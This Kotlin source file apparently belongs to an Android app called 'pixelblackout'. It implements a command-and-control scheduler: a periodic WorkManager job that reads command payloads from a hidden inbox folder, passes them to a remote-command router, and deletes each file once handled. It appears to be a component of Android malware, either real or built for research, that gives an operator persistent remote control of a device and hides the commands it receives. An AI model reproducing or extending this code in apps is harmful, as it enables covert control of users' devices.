package com.example.pixelblackout.c2

import android.content.Context
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.ExistingWorkPolicy
import java.io.File
import java.util.concurrent.TimeUnit

object C2Scheduler {
    private const val PERIODIC_WORK_NAME = "pixelblackout-c2"
    private const val ONE_SHOT_WORK_NAME = "pixelblackout-c2-once"

    fun schedule(context: Context) {
        val workManager = WorkManager.getInstance(context)
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val periodicRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setInitialDelay(30, TimeUnit.SECONDS)
            .build()

        workManager.enqueueUniquePeriodicWork(
            PERIODIC_WORK_NAME,
            ExistingPeriodicWorkPolicy.KEEP,
            periodicRequest
        )

        // Kick off an immediate sync the first time schedule is invoked so listeners start quickly.
        val oneShot = OneTimeWorkRequestBuilder<C2Worker>()
            .setConstraints(constraints)
            .build()
        workManager.enqueueUniqueWork(
            ONE_SHOT_WORK_NAME,
            ExistingWorkPolicy.KEEP,
            oneShot
        )
    }

    class C2Worker(
        context: Context,
        params: WorkerParameters
    ) : CoroutineWorker(context, params) {

        override suspend fun doWork(): Result {
            val inbox = File(applicationContext.filesDir, "c2/inbox")
            if (!inbox.exists() || !inbox.isDirectory) {
                return Result.success()
            }
            val files = inbox.listFiles()?.sortedBy { it.name } ?: return Result.success()
            if (files.isEmpty()) {
                return Result.success()
            }

            files.forEach { file ->
                runCatching {
                    val payload = file.readText(Charsets.UTF_8).trim()
                    if (payload.isNotEmpty()) {
                        RemoteCommandRouter.dispatch(payload)
                    }
                }
                file.delete()
            }
            return Result.success()
        }
    }
}
